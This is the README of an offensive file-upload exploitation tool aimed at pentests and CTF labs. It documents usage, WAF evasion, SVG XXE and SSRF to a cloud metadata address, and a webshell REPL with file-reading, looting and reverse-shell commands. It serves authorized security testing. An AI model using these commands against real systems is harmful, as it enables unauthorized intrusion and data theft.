# uploadpwn

> Universal file-upload attack tool for authorized penetration tests, HTB/OSCP labs, and CTFs.

`uploadpwn` is a single-file Python tool. Point it at a target URL and it will
auto-discover upload endpoints, harvest required form fields, run the full
bypass matrix (`.htaccess`, polyglots, parser confusion, nginx tricks,
`web.config`, SVG XXE, race, zip-slip), learn the storage path from the upload
response, and verify RCE with a nonce-wrapped probe — no false positives.

> ⚠️ **Authorized use only.** HTB / CTF / lab targets, owned infrastructure, or
> systems within a written pentest scope.

---

## Install

```bash
git clone https://github.com/xl337x/uploadpwn.git
cd uploadpwn
pip install -r requirements.txt
```

**Requirements:** Python 3.8+. Hard deps: `requests`. Soft deps:
`beautifulsoup4` (form scraping), `pyotp` (TOTP auth), `Pillow` (polyglot
validation). Optional: `selenium` (`--login-method selenium`),
`requests-ntlm` (`--ntlm-auth`).

Sanity check:

```bash
python uploadpwn.py --help
pytest -q                 # 82/82 tests should pass
```

---

## Usage

### The simplest run

```bash
python uploadpwn.py -t http://TARGET --i-am-authorized
```

That single command will:

1. Probe `/` and fingerprint the stack (server / language / OS).
2. Discover upload endpoints from forms, JS bundles, `robots.txt`, `sitemap.xml`,
   OpenAPI, OPTIONS/WebDAV, GraphQL, and a small brute-force list.
3. Auto-harvest hidden form fields (CSRF tokens, `__VIEWSTATE`, named submit
   buttons like `submit=Purchase`, `<select>` defaults).
4. Run the bypass matrix cheapest-first: `.htaccess` → polyglots → parser
   confusion → nginx tricks → `web.config` → full filename×CT×shell matrix.
5. On any accepted upload, verify RCE with a nonce-wrapped `id`.
6. Print a structured report and write `uploadpwn_report.json`.

### Flags grouped by what they do

#### Target & endpoint

| Flag                           | Purpose                                                                  |
|--------------------------------|--------------------------------------------------------------------------|
| `-t, --target URL`             | Target base URL. Required unless `-r` supplies it.                       |
| `-r, --request FILE`           | Burp / raw HTTP request file (sqlmap-style).                             |
| `--https`                      | Force HTTPS when `-r` is used.                                           |
| `-e, --endpoint EP`            | Upload endpoint. Auto-detected if omitted. **Smart resolver — see below.** |
| `--field NAME`                 | File-upload field name. Auto-detected if omitted.                        |
| `--extra-field NAME=VALUE`     | Add a multipart field to every upload. Repeatable.                       |
| `--shell-dirs DIR [DIR ...]`   | Override the 17-dir storage brute list.                                  |
| `--cmd-param NAME`             | Webshell command parameter name (default `cmd`).                         |
| `--flag PATH`                  | File to read after RCE (default `/flag.txt`).                            |

The `--endpoint` flag accepts six shapes. Use whichever you typed:

| `-t` (target)         | `-e` (endpoint)                | Resolves to                                  |
|-----------------------|--------------------------------|----------------------------------------------|
| `http://10.0.0.1`     | `/upload.php`                  | `http://10.0.0.1/upload.php`                 |
| `http://10.0.0.1`     | `upload.php`                   | `http://10.0.0.1/upload.php`                 |
| `http://10.0.0.1`     | `http://other.tld/u.php`       | `http://other.tld/u.php` (target swaps)      |
| `http://10.0.0.1`     | `other.tld/u.php`              | `http://other.tld/u.php` (inherits scheme)   |
| `https://10.0.0.1`    | `other.tld:9000/u.php`         | `https://other.tld:9000/u.php`               |
| `https://10.0.0.1`    | `//other.tld/u.php`            | `https://other.tld/u.php`                    |

When the endpoint points to a different host than `-t`, the effective target
swaps automatically — the banner tells you it happened.

#### Authorization gate

| Flag                  | Purpose                                                                  |
|-----------------------|--------------------------------------------------------------------------|
| `--i-am-authorized`   | Operator asserts authorization. Stamps the audit log. Always pass this.  |
| `--captcha-prompt`    | When CAPTCHA is detected on the login page, surface it and pause for replay. |

#### Authentication

| Flag                                              | Use case                                  |
|---------------------------------------------------|-------------------------------------------|
| `--login PATH --user U --pass P`                  | HTML form login                           |
| `--login-method auto\|requests\|selenium`         | Force a login backend                     |
| `--nav PATH`                                      | Page to navigate to **after** login       |
| `--upload-page PATH`                              | Page where the upload form lives          |
| `--cookie NAME=VALUE`                             | Inject a cookie. Repeatable.              |
| `--header "Name: Value"`                          | Inject a header. Repeatable.              |
| `--basic-auth USER:PASS`                          | HTTP Basic                                |
| `--digest-auth USER:PASS`                         | HTTP Digest                               |
| `--ntlm-auth USER:PASS`                           | NTLM (needs `requests-ntlm`)              |
| `--bearer TOKEN`                                  | Static Bearer / JWT                       |
| `--api-key HEADER:VALUE`                          | Static API-key header                     |
| `--cert PATH[,KEYPATH]`                           | Client cert (mTLS)                        |
| `--json-login URL --token-path KEY`               | SPA-style JSON login + token extraction   |
| `--csrf-path KEY --csrf-header NAME`              | Rotating CSRF in the JSON body            |
| `--otp-value CODE`                                | One-shot OTP                              |
| `--otp-totp-secret B32`                           | TOTP secret — auto-generates code         |
| `--otp-prompt`                                    | Prompt operator at runtime                |
| `--otp-field NAME`                                | Form field for the OTP code               |
| `--otp-url PATH`                                  | Explicit `/verify-otp` page               |
| `--relogin-on-expiry`                             | Re-run login if session dies mid-scan     |

#### Transport

| Flag                          | Purpose                                                                 |
|-------------------------------|-------------------------------------------------------------------------|
| `--proxy URL`                 | Proxy (e.g. Burp at `http://127.0.0.1:8080`).                           |
| `-k, --insecure`              | Disable TLS verification.                                               |
| `--ca-bundle PATH`            | Custom CA bundle.                                                       |
| `--timeout SEC`               | Per-request timeout (default 15).                                       |
| `--delay SEC`                 | Sleep between requests (WAF evasion).                                   |
| `--jitter SEC`                | Random ± jitter on top of `--delay`.                                    |
| `--rate-limit RPS`            | Hard cap on requests per second.                                        |
| `--request-budget N`          | Total request cap per run (default 5000). Exit code **4** if exhausted. |
| `--waf-pause SEC`             | Sleep N seconds when a WAF fingerprint is seen (default 3, 0 disables). |
| `--retry N`                   | Per-request retries on 429/5xx with exponential backoff.                |
| `--backoff F`                 | Backoff factor for retries.                                             |
| `--threads N`                 | Concurrent workers for the matrix.                                      |
| `--user-agent STR`            | Override the User-Agent.                                                |

#### Modules

| Flag                          | What it runs                                                            |
|-------------------------------|-------------------------------------------------------------------------|
| `--all`                       | Run every module.                                                       |
| `--matrix`                    | Full filename × shell × content-type matrix (default if nothing else).  |
| `--htaccess`                  | 32 `.htaccess` / `.user.ini` / `php.ini` tricks.                        |
| `--polyglots`                 | 14 real polyglot images (PNG/JPEG/GIF/PDF/ZIP/SVG/Phar/WebP/AVIF/...).  |
| `--parser-confusion`          | 19 filename + Content-Disposition smuggles.                             |
| `--nginx-tricks`              | 12 nginx / FPM / Tomcat / Jetty path-info tricks.                       |
| `--webconfig`                 | 8 IIS `web.config` handler-hijack variants.                             |
| `--svg-read PATH`             | SVG XXE file read.                                                      |
| `--svg-src FILE`              | SVG XXE PHP source read.                                                |
| `--svg-xss`                   | SVG XSS payload.                                                        |
| `--svg-ssrf URL`              | SVG SSRF probe.                                                         |
| `--race`                      | Upload-then-delete race condition.                                      |
| `--zip`                       | Zip-slip.                                                               |
| `--dos`                       | DoS payload — needs explicit per-run consent.                           |
| `--discover`                  | Run upload-form-field discovery and exit.                               |
| `--discover-only`             | Run **endpoint** discovery and exit (no attacks).                       |
| `--attack-all`                | Drive every discovered endpoint, not just the top one.                  |
| `--exhaust`                   | Don't stop on first RCE under `--attack-all`.                           |
| `--cleanup`                   | DELETE every uploaded artifact at end of run.                           |
| `--crawl-depth N`             | Discovery crawl depth (default 2).                                      |
| `--max-pages N`               | Discovery crawl page cap (default 20).                                  |
| `--no-probe`                  | Skip filter fingerprinting.                                             |

#### Output

| Flag                        | Purpose                                                                  |
|-----------------------------|--------------------------------------------------------------------------|
| `--interactive`             | Drop into the webshell REPL on RCE.                                      |
| `-v, --verbose`             | Verbose per-attempt logging.                                             |
| `-o, --output FILE`         | JSON report path (default `uploadpwn_report.json`).                      |

---

## Scenarios end-to-end

### 1. HTB-style box with a public upload form

```bash
python uploadpwn.py -t http://10.10.11.42 --i-am-authorized --interactive
```

Drops into an interactive webshell on RCE. The REPL supports:

```
!read /etc/passwd          # cat
!ls /var/www               # list a dir
!find /var/www -name '*.php'
!revshell 10.10.14.7 4444  # generates a one-liner
!loot                      # auto-collect /etc/passwd, crons, SUID
```

### 2. Authenticated upload behind a login

```bash
python uploadpwn.py \
  -t http://target.com \
  --login /login.php --user admin --pass hunter2 \
  --upload-page /dashboard \
  --i-am-authorized
```

Handles CSRF tokens, multi-step wizards (login → 2FA → dashboard), and
session-expiry mid-scan (add `--relogin-on-expiry`).

### 3. SPA with JSON login and rotating CSRF

```bash
python uploadpwn.py \
  -t https://api.target.com \
  --json-login /api/v1/auth/login --user admin --pass hunter2 \
  --token-path access_token --csrf-path next_csrf \
  --csrf-header X-CSRF-Token \
  --i-am-authorized
```

`--token-path` pulls the token out of the JSON response (`{"access_token": "..."}`)
and pins it as `Authorization: Bearer <token>`. `--csrf-path` rotates the CSRF
header on every response.

### 4. Re-using a Burp request

Export the upload request from Burp (Right-click → Copy → Copy as raw),
save it as `burp.txt`, then:

```bash
python uploadpwn.py -r burp.txt --i-am-authorized
```

Everything (URL, headers, cookies, file field, body parameters) is derived
from the dump. Add `-t` only to retarget; CLI flags override individual fields.

### 5. OTP / 2FA login

```bash
# TOTP — auto-generates the code
python uploadpwn.py -t http://target.com \
  --login /login --user alice --pass hunter2 \
  --otp-totp-secret JBSWY3DPEHPK3PXP \
  --i-am-authorized

# Prompt operator at runtime
python uploadpwn.py -t http://target.com \
  --login /login --user alice --pass hunter2 \
  --otp-prompt \
  --i-am-authorized
```

### 6. CAPTCHA on the login page

```bash
python uploadpwn.py -t http://target.com \
  --login /login --user alice --pass hunter2 \
  --captcha-prompt --i-am-authorized
```

The tool detects reCAPTCHA / hCaptcha / Turnstile, pauses, and tells you to
solve it in a browser and replay the session cookie via `--cookie`.

### 7. Multi-endpoint sites — drive every upload

```bash
# Stop on first RCE
python uploadpwn.py -t http://target.com --attack-all --i-am-authorized

# Map every viable bypass on every endpoint (no early-exit)
python uploadpwn.py -t http://target.com --attack-all --exhaust --i-am-authorized
```

### 8. Endpoint discovery only — no attacks fired

```bash
python uploadpwn.py -t http://target.com --discover-only --i-am-authorized
```

Prints a ranked list of every endpoint discovered (form, JS, robots, sitemap,
OpenAPI, OPTIONS, GraphQL, brute) with confidence scores.

### 9. Quiet / throttled run for WAFed targets

```bash
python uploadpwn.py -t http://target.com \
  --delay 1.0 --jitter 0.5 \
  --rate-limit 2 \
  --request-budget 800 \
  --waf-pause 10 \
  --i-am-authorized
```

`--delay 1.0 --jitter 0.5` → 0.5–1.5s between requests.
`--rate-limit 2` → never exceed 2 RPS.
`--waf-pause 10` → on every WAF fingerprint, sleep 10s once before continuing.
`--request-budget 800` → abort with exit code 4 if 800 requests are spent
without success.

### 10. Single module + verbose tracing

```bash
python uploadpwn.py -t http://target.com --htaccess -v --i-am-authorized
```

Skip the matrix entirely; just try the 32 `.htaccess` tricks. Useful when you
already know Apache + PHP-FPM is in scope.

### 11. SVG-based attacks

```bash
# Read a file via SVG XXE
python uploadpwn.py -t http://target.com --svg-read /flag.txt --i-am-authorized

# Read PHP source via SVG XXE
python uploadpwn.py -t http://target.com --svg-src upload.php --i-am-authorized

# SSRF via SVG
python uploadpwn.py -t http://target.com --svg-ssrf http://169.254.169.254/ --i-am-authorized
```

### 12. Clean up after the engagement

```bash
python uploadpwn.py -t http://target.com --all --cleanup --i-am-authorized
```

Every uploaded `.htaccess` / `.user.ini` / `web.config` / shell artifact is
removed. Strategy: HTTP DELETE on every learned served URL first; if that
fails (most servers 405 on DELETE), `rm` / `del` through the confirmed
webshell.

### 13. Proxy everything through Burp

```bash
python uploadpwn.py -t http://target.com \
  --proxy http://127.0.0.1:8080 \
  -k \
  --i-am-authorized
```

`-k` disables TLS verification (you'll need it for Burp's CA on HTTPS).

---

## Exit codes

| Code | Meaning                                                              |
|------|----------------------------------------------------------------------|
| `0`  | RCE confirmed, or `--discover-only` completed.                       |
| `1`  | Run finished without RCE. Some uploads may have been accepted.       |
| `2`  | Auth failed, CAPTCHA without `--captcha-prompt`, mass-target refused.|
| `3`  | Network unreachable / connection error.                              |
| `4`  | `--request-budget` exhausted.                                        |
| `130`| Interrupted by operator (Ctrl-C).                                    |

---

## Report

`uploadpwn_report.json` is written on every run:

```json
{
  "tool": "uploadpwn",
  "version": "5.0.0",
  "target": "http://10.10.11.42",
  "start": "...",
  "end":   "...",
  "filters": {"Content-Type Filter": "bypassed", ".htaccess": "bypassed"},
  "rce":      [{"file": "shell.jpg", "url": "...", "output": "uid=33(www-data)..."}],
  "outcomes": {
    "RCE_CONFIRMED":   1,
    "UPLOAD_ACCEPTED": 1,
    "FILTER_BYPASSED": 4,
    "FAILED":          0
  },
  "artifacts": [],
  "steps": [
    {"ts":"...", "category":"RCE", "status":"found",
     "state":"RCE_CONFIRMED", "target":"http://.../shell.jpg",
     "payload_sha256":"..."}
  ],
  "suggestions": ["Use .phtml, .pht, .php5 to bypass blacklist"]
}
```

Every RCE in the report is nonce-verified. The tool never prints
`RCE_CONFIRMED` on a substring match.
